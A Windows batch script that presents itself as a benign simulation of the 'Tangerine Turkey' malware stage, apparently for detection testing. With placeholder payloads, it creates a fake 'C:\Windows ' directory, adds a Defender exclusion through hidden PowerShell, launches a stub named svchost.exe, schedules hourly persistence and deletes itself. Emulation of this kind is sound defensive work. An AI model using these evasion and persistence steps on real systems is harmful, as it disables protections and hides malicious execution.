@echo off
REM Tangerine Turkey simulation - BAT stage
REM Simulates fake System32 dir, xcopy, printui abuse, miner launch, cleanup

setlocal enabledelayedexpansion

REM Working dir (where VBS copied us)
set WORKDIR=%TEMP%\TT_Sim

REM Fake Windows directory with trailing space (masquerading)
set FAKE_WIN=C:\Windows 
set FAKE_SYS=%FAKE_WIN%\System32

REM Create fake System32 directory (note the space in C:\Windows )
if not exist "%FAKE_SYS%" (
    mkdir "%FAKE_SYS%"
)

REM Copy a legitimate LOLBin (printui.exe) to fake System32 if present
if exist "C:\Windows\System32\printui.exe" (
    xcopy "C:\Windows\System32\printui.exe" "%FAKE_SYS%\" /Y >nul 2>&1
)

REM Copy our fake DLL / DAT placeholders (just text files in this sim)
echo Dummy DLL content> "%FAKE_SYS%\printui.dll"
echo Dummy DAT content> "%FAKE_SYS%\svculdr64.dat"

REM Copy our benign “miner” stub (svchost.exe) into fake System32
if exist "%WORKDIR%\svchost.exe" (
    xcopy "%WORKDIR%\svchost.exe" "%FAKE_SYS%\" /Y >nul 2>&1
)

REM Simulate Defender exclusion via PowerShell (defense evasion)
powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden ^
  -Command "Try { Add-MpPreference -ExclusionPath '%FAKE_SYS%' } Catch {}"

REM Simulate DLL-sideloaded execution via printui.exe launching the stub
REM (In reality we just start our benign EXE from the fake System32)
if exist "%FAKE_SYS%\svchost.exe" (
    start "" "%FAKE_SYS%\svchost.exe"
)

REM Optional: create a simple scheduled task to simulate persistence
schtasks /Create /SC HOURLY /MO 1 /TN "TT_Sim_Task" /TR "\"%FAKE_SYS%\svchost.exe\"" /F >nul 2>&1

REM Simulated cleanup/anti-analysis similar to timeout + rmdir/del
timeout /t 10 /nobreak >nul
REM In real TT they try to delete fake C:\Windows  & DAT, here we only clean workdir
del /q "%WORKDIR%\x123456.bat" >nul 2>&1

endlocal
exit /b 0

